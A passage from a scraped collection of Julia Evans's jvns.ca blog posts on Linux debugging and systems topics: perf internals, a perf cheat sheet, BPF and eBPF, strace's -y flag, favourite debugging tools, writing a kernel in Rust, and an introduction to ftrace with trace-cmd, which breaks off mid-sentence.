running  ls . This code might get scheduled on and off the CPU a few times. \n\n So! Here’s what I think this looks like. \n\n kernel: ok let's run ls for a while\nkernel: CPU! Start counting CPU instructions!\nCPU: <complies silently>\nkernel: <runs ls>\nls: yayyyyyyyyyy\nkernel: <stops running ls>\nkernel: CPU! How many instructions was that! (`rdpmc`)\nCPU: 10,200!\nkernel: <increments counter by 10,200>\n \n\n One important outcome of this, if I understand correctly is – hardware counters are exact counters, and they’re low enough overhead that the kernel can just always run  rdpmc  every time it’s done running a piece of code. There’s no sampling or approximations involved. \n\n Sampling software events \n\n The core of perf events looks like it’s in  kernel/events/core.c . This file includes the definition of the  perf_event_open  system call, on line 8107. Files with 10,000 lines of C code are not my specialty, but I’m going to try to make something of this. \n\n My goal: understand how perf does sampling of CPU events. For the sake of argument, let’s pretend we only wanted to save the state of the CPU’s registers every time we sample. \n\n We know from the  perf_event_open  man page  that perf writes out events to userspace (“hi! I am in julia’s awesome function right now!”). It writes events to a mmap’d  ring buffer . Which is some data structure in memory. Okay. \n\n Further inspection of this 10,000 line  core.c  file reveals that the code outputs data to userspace in the  perf_event_update_userpage  function. \n\n So, let’s find the code that copies all the x86 registers into userspace! It turns out it’s not too hard to find – it’s in this file called  perf_regs.c . There are like 15 registers to copy! Neat. \n\n In this case it makes sense that we sample – we definitely couldn’t save all the registers every instruction. That would be way too much work! \n\n So now I can see a little tiny bit of the code that perf uses to do sampling. This isn’t terribly enlightening, but it does make me feel better. \n\n Questions \n\n \n when does perf do its sampling? is it when the process gets scheduled onto the CPU? how is the sampling triggered? I am completely confused about this. \n what is the relationship between perf and kprobes? if I just want to sample the registers / address of the instruction pointer from  ls ’s execution, does that have anything to do with kprobes? with ftrace? I think it doesn’t, and that I only need kprobes if I want to instrument a kernel function (like a system call), but I’m not sure. \n are kprobes and ftrace the same kernel system? I feel like they are but I am confused. \n \n\n reading kernel code: not totally impossible \n\n I probably skimmed like 4000 lines of Linux kernel code (the perf parts!) to write this post, in 3 hours. There are definitely at least 20,000 lines of code related to perf. Maybe 100,000? I do not have the Linux source on my computer – I used livegrep and github to look at it. \n\n I only understood probably 10% of what I looked at, but I still learned some things about how perf works internally! This is neat. \n\n"},
{"url": "https://jvns.ca/blog/2017/12/27/a-perf-cheat-sheet/", "title": "A perf cheat sheet", "content": "\n      Right now I’m working on finishing up a zine about perf that I started back in May, and I’ve been\nstruggling with how to explain all there is to say about perf in a concise way. \n\n Yesterday I finally hit on the idea of making a 1-page cheat sheet reference which covers all of the\nbasic perf command line arguments. I’m going to make it the centerfold for the zine. \n\n It has a lot of the basics, as well as some slightly more advanced stuff – for example  sudo perf top -e raw_syscalls:sys_enter -ns comm -d 1  counts system calls by process and shows you live updates, and  stdbuf -oL perf top -e net:net_dev_xmit -ns comm | strings  counts sent network packets by process and prints an update every second. I didn’t realize you could do either of those things! \n\n All the examples in this cheat sheet are taken (with permission) from  http://brendangregg.com/perf.html , which is a\nfantastic perf reference and has many more great examples. \n\n Here it is. You can click to make it bigger. There’s also a print version:  perf cheat sheet PDF . \n\n \n \n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2017/06/28/notes-on-bpf---ebpf/", "title": "Notes on BPF & eBPF", "content": "\n     \n\n Today it was Papers We Love, my favorite meetup! Today  Suchakra Sharma  ( @tuxology  on twitter/github)\ngave a GREAT talk about the original BPF paper and recent work in Linux on\neBPF. It really made me want to go write eBPF programs! \n\n The paper is  The BSD Packet Filter: A New Architecture for User-level Packet Capture \n\n I wanted to write some notes on the talk here because I thought it was super\nsuper good. \n\n To start, here are the\n slides  and a\n pdf . The pdf is good\nbecause there are links at the end and in the PDF you can click the links. \n\n \n\n what’s BPF? \n\n Before BPF, if you wanted to do packet filtering you had to copy all the\npackets into userspace and then filter them there (with “tap”). \n\n this had 2 problems: \n\n \n if you filter in userspace, it means you have to copy all the packets into userspace, copying data is expensive \n the filtering algorithms people were using were inefficient \n \n\n The solution to problem #1 seems sort of obvious, move the filtering logic into\nthe kernel somehow. Okay. (though the details of how that’s done isn’t obvious,\nwe’ll talk about that in a second) \n\n But why were the filtering algorithms inefficient! Well!! \n\n If you run  tcpdump host foo  it actually runs a relatively complicated query,\nwhich you could represent with this tree: \n\n \n \n \n\n Evaluating this tree is kind of expensive. so the first insight is that you can\nactually represent this tree in a simpler way, like this: \n\n \n \n \n\n Then if you have  ether.type = IP  and  ip.src = foo  you automatically know\nthat the packet matches  host foo , you don’t need to check anything else. So\nthis data structure (they call it a “control flow graph” or “CFG”) is a way\nbetter representation of the program you actually want to execute to check\nmatches than the tree we started with. \n\n How BPF works in the kernel \n\n The main important here is that packets are just arrays of bytes. BPF programs\nrun on these arrays of bytes. They’re not allowed to have loops but they  can \nhave smart stuff to figure out the length of the IP header (IPv6 & IPv4 are\ndifferent lengths!) and then find the TCP port based on that length \n\n x = ip_header_length\nport = *(packet_start + x + port_offset) \n \n\n (it looks different from that but it’s basically the same). There’s a nice\ndescription of the virtual machine in the paper/slides so I won’t explain it. \n\n When you run  tcpdump host foo  this is what happens, as far as I understand \n\n \n convert  host foo  into an efficient DAG of the rules \n convert that DAG into a BPF program (in BPF bytecode) for the BPF virtual machine \n Send the BPF bytecode to the Linux kernel, which verifies it \n compile the BPF bytecode program into native code. For example  here’s the JIT code for ARM  and for  x86 \n when packets come in, Linux runs the native code to decide if that packet should be filtered or not. It’l often run only 100-200 CPU instructions for each packet that needs to be processed, which is super fast! \n \n\n the present: eBPF \n\n But BPF has been around for a long time! Now we live in the EXCITING FUTURE\nwhich is eBPF. I’d heard about eBPF a bunch before but I felt like this helped\nme put the pieces together a little better. (i wrote this  XDP & eBPF post  back in April when I was at netdev) \n\n some facts about eBPF: \n\n \n eBPF programs have their own bytecode language, and are compiled from that\nbytecode language into native code in the kernel, just like BPF programs \n eBPF programs run in the kernel \n eBPF programs can’t access arbitrary kernel memory. Instead the kernel\nprovides functions to get at some restricted subset of things. \n they  can  communicate with userspace programs through BPF maps \n there’s a  bpf  syscall as of Linux 3.18 \n \n\n kprobes & eBPF \n\n You can pick a function (any function!) in the Linux kernel and execute a\nprogram that you write every time that function happens. This seems really\namazing and magical. \n\n For example! There’s this  BPF program called disksnoop  which tracks when you start/finish writing a block to disk.\nHere’s a snippet from the code: \n\n BPF_HASH(start, struct request *);\nvoid trace_start(struct pt_regs *ctx, struct request *req) {\n\t// stash start timestamp by request ptr\n\tu64 ts = bpf_ktime_get_ns();\n\tstart.update(&req, &ts);\n}\n...\nb.attach_kprobe(event=\"blk_start_request\", fn_name=\"trace_start\")\nb.attach_kprobe(event=\"blk_mq_start_request\", fn_name=\"trace_start\")\n \n\n This basically declares a BPF hash (which the program uses to keep track of\nwhen the request starts / finishes), a\nfunction called  trace_start  which is going to be compiled into BPF bytecode,\nand attaches  trace_start  to the  blk_start_request  kernel function. \n\n This is all using the  bcc  framework which lets you write Python-ish programs\nthat generate BPF code. You can find it (it has tons of example programs) at\n https://github.com/iovisor/bcc \n\n uprobes & eBPF \n\n So I sort of knew you could attach eBPF programs to kernel functions, but I\ndidn’t realize you could attach eBPF programs to userspace functions! That’s\nreally exciting. Here’s\n an example of counting malloc calls in Python using an eBPF program . \n\n things you can attach eBPF programs to \n\n \n network cards, with XDP (which I wrote about a while back) \n tc egress/ingress (in the network stack) \n kprobes (any kernel function) \n uprobes (any userspace function apparently ?? like in any C program with\nsymbols.) \n probes that were built for dtrace called “USDT probes” (like  these mysql probes ).\nHere’s an  example program using dtrace probes \n the JVM \n tracepoints (not sure what that is yet) \n seccomp / landlock security things \n a bunch more things \n \n\n this talk was super cool \n\n There are a bunch of great links in the slides and in\n LINKS.md  in the iovisor\nrepository. It is late now but soon I want to actually write my first eBPF\nprogram! \n\n"},
{"url": "https://jvns.ca/blog/2016/06/07/strace-y/", "title": "A useful new strace feature", "content": "\n     \n\n I just upgraded my computer to Ubuntu 16.04, from 12.04. So, expect occasional updates on what has happened in the last 4 years since I am a computer dinosaur. \n\n Now, as you all know, strace is my favorite program. So updates to my favorite program are EXTREMELY EXCITING. \n\n When you run strace, you’ll see a lot of lines like this: \n\n write(1, \"aio.h\\t       btrfs\\t   elf.h...\") = 172\n \n\n The number “1” is a  file descriptor . Another thing that it is is NOT VERY INFORMATIVE. It’s important to know about file descriptors, but when I tell people about strace, I always feel like it’s kind of annoying! Why can’t strace just tell me which file it wrote to, instead of hiding it behind some number? \n\n WELL NOW IT CAN. There is a new flag:  -y ! Let’s imagine we don’t fully understand the difference between  cp  and  mv , and we want to find out. For this task, I decided to copy a 1GB Ubuntu 16.04 ISO image from my desktop to  /tmp/blah . \n\n strace -o out -y cp ubuntu-16.04-desktop-amd64.iso /tmp/blah \n \n\n Now let’s see what it did! We still get to keep the file descriptors, but it appends the filename of the file it was reading from! Awesome! We can see that it’s reading 128KB (128 * 1024 = 131072 bytes) at a time from the source file ( /home/bork/Desktop/ubuntu-16.04-desktop-amd64.iso ), and writing them into the destination file ( /tmp/blah ). Seems reasonable! \n\n read(3</home/bork/Desktop/ubuntu-16.04-desktop-amd64.iso>, \"\\315\\350\\5p\\244\\334\\266\\213 \\2553~\\37\\7\\330w\\3125\\316\\360u\\204P\\236\\255\\n\\244\\344\\264\\327\\213\\241\"..., 131072) = 131072\nwrite(4</tmp/blah>, \"\\315\\350\\5p\\244\\334\\266\\213 \\2553~\\37\\7\\330w\\3125\\316\\360u\\204P\\236\\255\\n\\244\\344\\264\\327\\213\\241\"..., 131072) = 131072\nread(3</home/bork/Desktop/ubuntu-16.04-desktop-amd64.iso>, \"\\37\\367\\336\\377\\247!\\357\\377\\200\\337wV\\335\\366|\\232\\337?\\373iz\\37r\\376/z5\\275\\377\\360\\247\\335\"..., 131072) = 131072\nwrite(4</tmp/blah>, \"\\37\\367\\336\\377\\247!\\357\\377\\200\\337wV\\335\\366|\\232\\337?\\373iz\\37r\\376/z5\\275\\377\\360\\247\\335\"..., 131072) = 131072\nread(3</home/bork/Desktop/ubuntu-16.04-desktop-amd64.iso>, \"x\\321/|'m\\25\\313o \\261t^b\\306\\17r4~\\3138j\\6\\4\\244\\3308\\300E\\366\\364\\22\"..., 131072) = 131072\nwrite(4</tmp/blah>, \"x\\321/|'m\\25\\313o \\261t^b\\306\\17r4~\\3138j\\6\\4\\244\\3308\\300E\\366\\364\\22\"..., 131072) = 131072\nread(3</home/bork/Desktop/ubuntu-16.04-desktop-amd64.iso>, \"j\\273\\324\\332\\216\\361\\207\\204\\336\\243\\326\\267\\227\\35\\322\\370\\205\\245N6+\\211h\\246\\215\\32k\\336\\0\\r\\320.\"..., 131072) = 131072\nwrite(4</tmp/blah>, \"j\\273\\324\\332\\216\\361\\207\\204\\336\\243\\326\\267\\227\\35\\322\\370\\\n \n\n What about  mv ubuntu-16.04-desktop-amd64.iso .. ?  What does that do? \n\n rename(\"ubuntu-16.04-desktop-amd64.iso\", \"../ubuntu-16.04-desktop-amd64.iso\") = 0\n \n\n That’s just one system call! No wonder moving is so fast and copying is so slow :) \n\n usability is cool (and, -yy!) \n\n I love seeing programs like strace get usability improvements! This is awesome. If you run strace with  -yy , and you’re doing networking, it’ll resolve file descriptors into a source & destination IP address and port, like this! \n\n This is querying my DNS server on localhost for  blah.com  and getting no answer. \n\n $ strace -yy wget blah.com\nrecvfrom(3<UDP:[127.0.0.1:46218->127.0.1.1:53]>, \"\\270\\222\\201\\205\\0\\1\\0\\0\\0\\0\\0\\0\\4blah\\3com\\0\\0\\1\\0\\1\", 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"127.0.1.1\")}, [16]) = 26\n \n\n"},
{"url": "https://jvns.ca/blog/2016/07/03/debugging-tools-i-love/", "title": "Linux debugging tools I love", "content": "\n     \n\n I gave a talk this weekend about debugging tools I love (here are  the slides , such as they are). I think of these tools like a swiss army knife – if something on your system is wrong or slow, in any programming language, knowing how to use them can really help you out. I’ve written pretty extensively on this, but I didn’t have a central list to refer to. So! Here’s the list of my current favorite tools. There are only 5! I’ve used all of them (except opensnoop) to debug actual problems. \n\n tcpdump and wireshark and opensnoop are also things that you can have on OS X. \n\n strace \n\n A tool that traces system calls. My favorite thing. I have a bunch of posts with examples of how to use it on this blog. If you want to read what I think of it you should read the fanzine reference that you can read  here . \n\n strace is pretty broadly useful, but keep in mind it can really slow down your programs. \n\n I would be remiss if I did not mention the even-more-awesome dtrace. Colin Jones has a  nice introduction . \n\n dstat \n\n A really simple tool that prints out how much data got sent over the network / written to disk every second. This is great when you suspect something is going on with network/disk usage and want to see what’s happening in real time. \n\n There’s also iostat and netstat and atop and a bunch of other tools, but dstat is my favorite. \n\n tcpdump + wireshark \n\n For spying on network traffic. I wrote an introduction explaining how to use them in  tcpdump is amazing . \n\n When using these, it really helps to have a basic understanding of how networking works. Luckily the basics (“what’s the difference between IP and TCP and HTTP? what’s a network packet?”) are totally possible to pick up :D. \n\n perf \n\n Have a C program and want to know which functions it’s spending the most time in?  perf  is a sampling profiler for Linux that can tell you that. \n\n perf top  gives you a live view of which functions are running right now, just like  top . I like to use  perf top  no matter what language my programs are written in, just to see if I can understand anything from it. Sometimes it works! \n\n node.js has built-in support for using perf to show you which Node function is running right now. You can also get this for JVM programs with perf-map-agent. \n\n Brendan Gregg’s website has the best  introduction to perf  I know. \n\n You can use perf to generate amazing  flame graphs  like this: \n\n \n\n opensnoop \n\n Opensnoop is a new script that you can get as of Ubuntu 16.04. It’s a delightfully simple tool – it just shows you which files are being opened right now on your computer. And it’s fast, unlike strace! \n\n opensnoop also exists on OS X and does basically the same thing. \n\n Go to the  iovisor/bcc  repo on github for installation instructions. It works using eBPF, which is a new thing that I will not explain yet here but Brendan Gregg has been writing about enthusiastically for some time. You don’t need to know how it works to use it, though :). \n\n"},
{"url": "https://jvns.ca/blog/2017/06/26/3-screencasts/", "title": "3 short screencasts (/proc, tcpdump, strace)", "content": "\n     \n\n On Sunday I was thinking about how I like giving short talks, but travelling to\ngive talks is so much work. What if I could give talks from my house? \n\n So I recorded 3 2-minute screencasts (nothing fancy, 1 take, no editing)\nshowing demos of /proc, strace, and tcpdump. Here they are! \n\n These were surprisingly easy to do and some people seemed to like them so maybe\nI’ll do more. Who knows! \n\n stracing python’s asyncio library \n\n \n\n tcpdump some dns queries \n\n \n\n /proc is awesome \n\n \n\n"},
{"url": "https://jvns.ca/blog/2014/03/12/the-rust-os-story/", "title": "Writing an OS in Rust in tiny steps (Steps 1-5)", "content": "\n      I’m giving a talk tomorrow on writing a kernel in Rust. \n\n My experience of writing a kernel that it was like jumping in puddles:\nit’s a lot of fun, and there are a lot of mishaps: \n\n \n\n Here are a few of the tiny steps I took. There are more, but those\nwill have to wait for the evening. \n\n \n\n Step 1: copy some code from the internet \n\n I didn’t know what I was doing, so I didn’t want to start from\nscratch! So I started with something that already existed! Behold\n rustboot , a tiny 32-bit\nkernel written in Rust. \n\n Rustboot does only two things, but it does them well! \n\n \n Turn the screen red \n Hang \n \n\n Of course what it actually does is a bit more complicated – there’s \n\n \n a loader written in assembly \n a Makefile that lets you run it with  qemu \n Some Rust code to clear the screen \n \n\n Here’s the code that clears the screen: \n\n unsafe fn clear_screen(background: Color) {\n    range(0, 80*25, |i| {\n        *((0xb8000 + i * 2) as *mut u16) = (background as u16) << 12;\n    });\n}\n \n\n What does this mean? The key part here is that the address of the VGA\nbuffer is  0xb8000 , so we’re setting some bytes there. And there’s a\nloop. \n\n Step 2: Turn the screen blue instead. \n\n The first thing I did was: \n\n \n Make sure I could run  rustboot . \n Change ‘red’ to ‘blue’ and run it again \n \n\n This sounds silly, but psychologically it’s an important step! It\nforced me to look at the code and understand how it worked, and it was\nreally exciting that it worked right away. \n\n Step 3: Start writing I/O functions \n\n The next obvious step now that I had a blue screen was to try to write\na  print  function. \n\n Here’s what it looked like! \n\n pub fn putchar(x: u16, y: u16, c: u8) {\n    let idx : uint =  (y * VGA_WIDTH * 2 + x * 2) as uint;\n    unsafe {\n        *((VGA_ADDRESS + idx) as *mut u16) = make_vgaentry(c, fg_color, bg_color);\n    }\n}\n \n\n I didn’t explain the  unsafe  block before. Everything inside\n unsafe{}  is  unsafe  code. This particular code is unsafe because it\naccesses a memory address directly. Wrapping it in an unsafe block\ntells Rust “okay, I checked and I promise this code is actually doing\nthe right thing and won’t blow anything up”. \n\n We can also look at  make_vgaentry : \n\n fn make_vgaentry(c: u8, fg: Color, bg: Color) -> u16 {\n    let color = fg as u16 | (bg as u16 << 4);\n    return c as u16 | (color << 8);\n}\n \n\n In the VGA buffer, each character is represented by 2 bytes (so a\n u16 ). The lower 8 bits are the ASCII character, and the upper 8 bits\nare the foreground and background colour (4 bits each).  Color  here\nis an enum so that I can refer to Red or Green directly. \n\n I found this part pretty approachable and it didn’t take too long.\nWhich isn’t to say that I didn’t have problems! I had SO MANY\nPROBLEMS. Most of my problems were to do with arrays and string and\niterating over strings. Here’s some code that caused me much pain: \n\n pub fn write(s: &str) {\n    let bytes : &[u8] = as_bytes(s);\n    for b in super::core::slice::iter(bytes) {\n        putc(*b);\n    }\n}\n \n\n This code looks simple! It is a lie.\nFriends. Here were some questions that I needed to ask to write this code. \n\n \n How do I turn a string into a byte array? ( as_bytes() ) \n What is the type of a byte array? ( &[u8] ) \n How do I iterate over a byte array? (+ “it still doesn’t work!”, 4 times) \n \n\n Also, what is this  super::core::slice::iter  business? This brings us\nto a fairly long digression, and an important point \n\n Why you can’t write a kernel in Python \n\n So you want to write an operating system, let’s say for x86. You need\nto write this in a programming language! \n\n Can you write your operating system in Python (using CPython, say)?\nYou cannot. This is not being curmudgeonly! It is actually just not\npossible. \n\n What happens when you write  print \"Hello!\"  in Python? \n\n Well, many things happen. But the  last  thing that happens is that\nthe CPython interpreter will do something like  printf(\"Hello\") . And\nyou might think, well, maybe I could link against the code for\n printf  somehow! \n\n But what  printf  does is it calls the  write()  system call. The\n write()  system call is implemented IN YOUR KERNEL. \n\n OH WAIT YOU DON’T HAVE A KERNEL YET. YOU ARE WRITING ONE. \n\n This also means that you can’t write a kernel as a “normal” C program\nwhich includes C libraries. Any C libraries. All C libraries for Linux\nare built on top of some version of  libc , which makes calls to the\nLinux kernel! So if you’re  writing  a kernel, this doesn’t work. \n\n Why you  can  write a kernel in Rust \n\n Writing Rust code has many of the same problems, of course! By\ndefault, if you compile a Rust program with a print statement, it will\ncall your kernel’s equivalent to  write . \n\n But! Unlike with Python, you can put  #[no_std]  at the beginning of\nyour Rust program. \n\n You lose a lot! You can no longer \n\n \n allocate memory \n do threading \n print anything \n many many more things \n \n\n It’s still totally fine to define functions and make calculations,\nthough. And you can of course define your own functions to allocate\nmemory. \n\n You also lose things like Rust’s iterators, which is sad! \n\n rust-core \n\n rust-core  is “a standard\nlibrary for Rust with freestanding support”. What this means is that\nif you’re writing an OS,  rust-core  will provide you with all kinds\nof helpful data structures and functions that you lost when you wrote\n #[no_std] . \n\n I found using this library pretty confusing, but the author hangs out\nin IRC all the time and was really friendly to me, so it wasn’t a huge\nproblem. \n\n So back to  super::core::slice::iter ! This says “iterate over this\nusing an iteration function from  rust-core “ \n\n Step 4: keyboard interrupts! \n\n So it took me a few days to learn how to print because I needed\nto learn about freestanding mode and get confused about rust-core and\nat the same time I didn’t really understand Rust’s types very well. \n\n Once that was done, I wanted to be able to do the following: \n\n \n Press a key (‘j’ for example) \n Have that letter appear on the screen. \n \n\n I thought this wouldn’t be too hard. I was pretty wrong. \n\n I wrote about what went wrong in\n After 5 days, my OS doesn’t crash when I press a key . \n\n It lists all my traumas in excruciating detail and I won’t repeat them\nhere. Go read it. It’s kinda worth it. I’ll wait. \n\n Step 5: malloc! \n\n After I’d done that, I thought it might be fun to be able to allocate\nmemory. \n\n You may be surprised at this point. We have printed strings! We have\nmade our keyboard work! Didn’t we need to allocate memory? Isn’t\nthat…  important ? \n\n It turns out that you can get away without doing it pretty easily!\nRust would automatically create variables on the stack for me, so I\ncould use local variables. And for anything else I could use global\nvariables, and the space for those was laid out at compile time. \n\n But allocating memory seemed like a fun exercise. To allocate\nsomething on the heap in Rust, you can do \n\n let a = ~2 \n\n This creates a pointer to a  2  on the heap. Of course, we talked\nbefore about how there is no malloc! So I wrote one, and then made\nsure that Rust knew about it. \n\n You can see the  malloc  function I wrote in\n Writing malloc wrong, for fun \n\n The hardest parts of this were not writing the function, but \n\n \n getting the type right \n Understanding how Rust’s language features can be turned on and off. \n \n\n WHAT DO YOU MEAN TURNED ON AND OFF, you may ask! \n\n So in  rust-core , if you go to\n heap.rs ,\nyou’ll see this code: \n\n #[lang = \"exchange_malloc\"]\npub unsafe fn alloc(size: uint) -> *mut u8 {\n    if size == 0 {\n        0 as *mut u8\n    } else {\n        let ptr = malloc(size);\n        if ptr == 0 as *mut u8 {\n            out_of_memory()\n        }\n        ptr\n    }\n}\n \n\n This weird-looking  #[lang = \"exchange_malloc\"]  bit means “Code like\n let x = ~2  is now allowed to work”. It requires there to be an\nimplementation of  malloc , which I wrote. It also needs implements of\n realloc  and  free , but I left those blank :) \n\n Before seeing that, Rust would not compile code that allocated memory. \n\n I think this language feature gating is really cool: it means that you\ncan write Rust programs that can allocate memory, but not do\nthreading. Or that can do hardly anything at all! \n\n I need to get up now. \n\n Next up:  running problems! AND SOMETHING IS ERASING MY PROGRAM WHILE\nIT IS RUNNING. \n"},
{"url": "https://jvns.ca/blog/2017/03/19/getting-started-with-ftrace/", "title": "ftrace: trace your kernel functions!", "content": "\n     \n\n Hello! Today we’re going to talk about a debugging tool we haven’t talked about\nmuch before on this blog: ftrace. What could be more exciting than a new\ndebugging tool?! \n\n Better yet, ftrace isn’t new! It’s been around since Linux kernel 2.6, or about 2008.\n here’s the earliest documentation I found with some quick Gooogling .\nSo you might be able to use it even if you’re debugging an older system! \n\n I’ve known that ftrace exists for about 2.5 years now, but hadn’t gotten around\nto really learning it yet. I’m supposed to run a workshop tomorrow where I talk\nabout ftrace, so today is the day we talk about it! \n\n what’s ftrace? \n\n ftrace is a Linux kernel feature that lets you trace Linux kernel function\ncalls. Why would you want to do that? Well, suppose you’re debugging a weird\nproblem, and you’ve gotten to the point where you’re staring at the source code\nfor your kernel version and wondering what  exactly  is going on. \n\n I don’t read the kernel source code very often when debugging, but occasionally\nI do! For example this week at work we had a program that was frozen and stuck\nspinning inside the kernel. Looking at what functions were being called helped us\nunderstand better what was happening in the kernel and what systems were\ninvolved (in that case, it was the virtual memory system)! \n\n I think ftrace is a bit of a niche tool (it’s definitely less broadly useful and\nharder to use than strace) but that it’s worth knowing about. So let’s learn\nabout it! \n\n first steps with ftrace \n\n Unlike strace and perf, ftrace isn’t a  program  exactly – you don’t\njust run  ftrace my_cool_function . That would be too easy! \n\n If you read  Debugging the kernel using Ftrace  it\nstarts out by telling you to  cd /sys/kernel/debug/tracing  and then do various\nfilesystem manipulations. \n\n For me this is way too annoying – a simple example of using ftrace this way is something like \n\n cd /sys/kernel/debug/tracing\necho function > current_tracer\necho do_page_fault > set_ftrace_filter\ncat trace\n \n\n This filesystem interface to the tracing system (“put values in these magic\nfiles and things will happen”) seems theoretically possible to use but really\nnot my preference. \n\n Luckily, team ftrace also thought this interface wasn’t that user friendly and\nso there is an easier-to-use interface called  trace-cmd !!! trace-cmd is a\nnormal program with command line arguments. We’ll use that! I found an intro to\ntrace-cmd on LWN at  trace-cmd: A front-end for Ftrace . \n\n getting started with trace-cmd: let’s trace just one function \n\n First, I needed to install  trace-cmd  with  sudo apt-get install trace-cmd . Easy enough. \n\n For this first ftrace demo, I decided I wanted to know when my kernel was handling a page fault.\nWhen Linux allocates memory, it often does it lazily (“you weren’t  really \nplanning to use that memory, right?“). This means that when an application\ntries to actually write to memory that it allocated, there’s a page fault and\nthe kernel needs to give the application physical memory to use. \n\n Let’s start  trace-cmd  and make it trace the  do_page_fault  function! \n\n $ sudo trace-cmd record -p function -l do_page_fault\n  plugin 'function'\nHit Ctrl^C to stop recording\n \n\n I ran it for a few seconds and then hit  Ctrl+C . Awesome! It created a 2.5MB\nfile called  trace.dat . Let’s see what’s that file! \n\n $ sudo trace-cmd report\n          chrome-15144 [000] 11446.466121: function:             do_page_fault\n          chrome-15144 [000] 11446.467910: function:             do_page_fault\n          chrome-15144 [000] 11446.469174: function:             do_page_fault\n          chrome-15144 [000] 11446.474225: function:             do_page_fault\n          chrome-15144 [000] 11446.474386: function:             do_page_fault\n          chrome-15144 [000] 11446.478768: function:             do_page_fault\n CompositorTileW-15154 [001] 11446.480172: function:             do_page_fault\n          chrome-1830  [003] 11446.486696: function:             do_page_fault\n CompositorTileW-15154 [001] 11446.488983: function:             do_page_fault\n CompositorTileW-15154 [001] 11446.489034: function:             do_page_fault\n CompositorTileW-15154 [001] 11446.489045: function:             do_page_fault\n \n\n This is neat – it shows me the process name (chrome), process ID (15144), CPU (000), and function that got traced. \n\n By looking at the whole report, ( sudo trace-cmd report | grep chrome ) I can\nsee that we traced for about 1.5 seconds and in that time Chrome had about 500\npage faults. Cool! We have done our first ftrace! \n\n next ftrace trick: let’s trace a process! \n\n Okay, but just seeing one function is kind of boring! Let’s say I want to know\neverything that’s happening for one program. I use a static site generator\ncalled Hugo. What’s the kernel doing for Hugo? \n\n Hugo’s PID on my computer right now is 25314, so I recorded all the kernel functions with: \n\n sudo trace-cmd record --help # I read the help!\nsudo trace-cmd record -p function -P 25314 # record for PID 25314\n \n\n sudo trace-cmd report  printed out 18,000 lines of output. If you’re\ninterested, you can see  all 18,000 lines here . \n\n 18,000 lines is a lot so here are some interesting excerpts. \n\n This looks like what happens when the  clock_gettime  system call runs. Neat! \n\n  compat_SyS_clock_gettime\n    SyS_clock_gettime\n       clockid_to_kclock\n       posix_clock_realtime_get\n          getnstimeofday64\n             __getnstimeofday64\n                arch_counter_read\n    __compat_put_timespec\n \n\n This is something related to process scheduling: \n\n  cpufreq_sched_irq_work\n    wake_up_process\n       try_to_wake_up\n          _raw_spin_lock_irqsave\n             do_raw_spin_lock\n          _raw_spin_lock\n             do_raw_spin_lock\n          walt_ktime_clock\n             ktime_get\n                arch_counter_read\n          walt_update_task_ravg\n             exiting_task\n \n\n Being able to see all these function calls is pretty cool, even if I don’t\nquite understand them. \n\n “function graph” tracing \n\n There’s another tracing mode called  function_graph . This is the same as the\nfunction tracer except that it instruments both entering  and  exiting a\nfunction.  Here’s the output of that tracer \n\n sudo trace-cmd record -p function_graph -P 25314\n \n\n Again, here’s a snipped (this time from the futex code) \n\n              |      futex_wake() {\n             |        get_futex_key() {\n             |          get_user_pages_fast() {\n  1.458 us   |            __get_user_pages_fast();\n  4.375 us   |          }\n             |          __might_sleep() {\n  0.292 us   |            ___might_sleep();\n  2.333 us   |          }\n  0.584 us   |          get_futex_key_refs();\n             |          unlock_page() {\n  0.291 us   |            page_waitqueue();\n  0.583 us   |            __wake_up_bit();\n  5.250 us   |          }\n  0.583 us   |          put_page();\n+ 24.208 us  |        }\n \n\n We see in this example that  get_futex_key  gets called right after  futex_wake . Is that what really happens in the source code? We can check!!  Here’s the definition of futex_wake in Linux 4.4  (my kernel version). \n\n I’ll save you a click: it looks like this: \n\n static int\nfutex_wake(u32 __user *uaddr, unsigned int flags, int nr_wake, u32 bitset)\n{\n\tstruct futex_hash_bucket *hb;\n\tstruct futex_q *this, *next;\n\tunion futex_key key = FUTEX_KEY_INIT;\n\tint ret;\n\tWAKE_Q(wake_q);\n\n\tif (!bitset)\n\t\treturn -EINVAL;\n\n\tret = get_futex_key(uaddr, flags & FLAGS_SHARED, &key, VERIFY_READ);\n \n\n So the first function called in  futex_wake  really is  get_futex_key ! Neat!\nReading the function trace was definitely an easier way to find that out than\nby reading the kernel code, and it’s nice to see how long all of the functions\ntook. \n\n How to know what functions you can trace \n\n If you run  sudo trace-cmd list -f  you’ll get a list of all the functions you\ncan trace. That’s pretty simple but it’s important. \n\n one last thing: events! \n\n So, now we know how to trace functions in the kernel! That’s really cool! \n\n There’s one more class of thing we can trace though! Some events don’t correspond super well to function calls. For example, you might want to know when a program is scheduled on or off the CPU! You might be able to figure that out by peering at function calls, but I sure can’t. \n\n So the kernel also gives you a few events so you can see when a few important\nthings happen. You can see a list of all these events with  sudo cat /sys/kernel/debug/tracing/available_events \n\n I looked at all the sched_switch events. I’m not exactly sure what sched_switch is but it’s something to do with scheduling I guess. \n\n sudo cat /sys/kernel/debug/tracing/available_events\nsudo trace-cmd record -e sched:sched_switch\nsudo trace-cmd report\n \n\n The output looks like this: \n\n  16169.624862:   Chrome_ChildIOT:24817 [112] S ==> chrome:15144 [120]\n 16169.624992:   chrome:15144 [120] S ==> swapper/3:0 [120]\n 16169.625202:   swapper/3:0 [120] R ==> Chrome_ChildIOT:24817 [112]\n 16169.625251:   Chrome_ChildIOT:24817 [112] R ==> chrome:1561 [112]\n 16169.625437:   chrome:1561 [112] S ==> chrome:15144 [120]\n \n\n so you can see it switching from PID 24817 -> 15144 -> kernel -> 24817 -> 1561 -> 15114. (all of these events are on the same CPU) \n\n how does ftrace work? \n\n ftrace is a dynamic tracing system. This means that when I start ftracing a\nkernel function, the  function’s code gets changed . So – let’s suppose that\nI’m tracing that  do_page_fault  function from before. The kernel will insert\nsome extra instructions in the assembly for that function to notify the tracing\nsystem every time that function gets called. The reason it can add extra\ninstructions is that Linux compiles in a few extra NOP instructions into every\nfunction, so there’s space to add tracing code when needed. \n\n This is awesome because it means that when I’m not using ftrace to trace my\nkernel, it doesn’t affect performance at all. When I do start tracing, the more\nfunctions I trace, the more overhead it’ll have. \n\n (probably some of this is wrong, but this is how I think ftrace works anyway) \n\n use ftrace more easily: brendan gregg’s tools & kernelshark \n\n As we’ve seen in this post, you need to think quite a lot about what individual\nkernel functions / events do to use ftrace directly. This is cool, but\nit’s also a lot of work! \n\n Brendan Gregg (our linux debugging tools hero) has repository of tools that 